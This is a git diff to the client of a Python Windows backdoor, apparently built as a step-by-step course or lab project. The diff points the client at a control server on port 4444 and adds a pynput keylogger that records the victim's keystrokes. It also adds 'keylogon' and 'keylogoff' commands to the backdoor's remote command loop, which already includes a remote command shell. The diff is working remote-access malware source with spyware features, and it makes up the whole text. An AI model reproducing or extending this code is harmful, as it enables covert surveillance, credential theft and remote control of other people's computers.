@@ -22,6 +22,7 @@ import webbrowser
 import pyscreeze
 from PIL import ImageGrab
 
+from pynput.keyboard import Listener, Controller, Key
 
 import win32api
 import winerror
@@ -36,8 +37,8 @@ from miscs.string_format import StringFormat
 
 # Step 2: Define Global Variables
 # TODO: for testing change SERVER_HOST to Kali WSL IP Address
-# SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
-SERVER_HOST = "172.29.132.195" # Kali WSL IP Address, Server for testing
+SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
+# SERVER_HOST = "172.29.132.195" # Kali WSL IP Address, Server for testing
 SERVER_PORT = 4444
 
 strPATH = path.realpath(argv[0])
@@ -49,6 +50,13 @@ intBuff = 1024
 vbOkOnly = "0"
 vbInformation = "64"
 vbSystemModal = "4096"
+
+
+""" Global variables used for Features """
+listener = None # Used for Switch keylog on or off
+keyLogs = [] # Used for Store logged keys
+
+
 
 # Step 3: Define and Create Mutex Object
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
@@ -257,6 +265,25 @@ def MessageBox(message):
 
     subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)
 
+def on_press(key_press):
+    """ Define function to record keys being pressed, and send them to the server.
+        This is called by the start method of pynput.keyboard's Listener. """
+    global keyLogs
+    keyLogs.append(key_press)
+
+
+def keylogger_on():
+    global listener, keyLogs
+    # When listener is None, mean the keylogger is OFF
+    if listener is None:
+        listener = Listener(on_press=on_press)
+        listener.start()
+        send(b"[+]-Client => A Key Logger is now Running on the Client.\n")
+    else:
+        send(b"[!]-Client => A Key Logger is already Running on the Client.\n")
+
+def keylogger_off():
+    pass
 
 def main_exec():
     while True:
@@ -294,6 +321,17 @@ def main_exec():
                 # Step 34: Add New `elif` Statement in Main While to Detect 'cmd' Command
                 elif strData == 'cmd':
                     command_shell()
+
+                # Aditional Section: Add Yakuza Designed Commands to the Backdoor
+
+                # When '--k 1(keylogon)' Command Submit, then Start Keylogger
+                elif strData == 'keylogon':
+                    keylogger_on()
+
+                # When '--k 0(keylogoff)' Command Submit, then Stop Keylogger and Send Back logged keys to the Server
+                elif strData == 'keylogoff':
+                    keylogger_off()
+
 
         # Handle if Backdoor Server not Responding try to Reconnect to Server
         except socket.error():
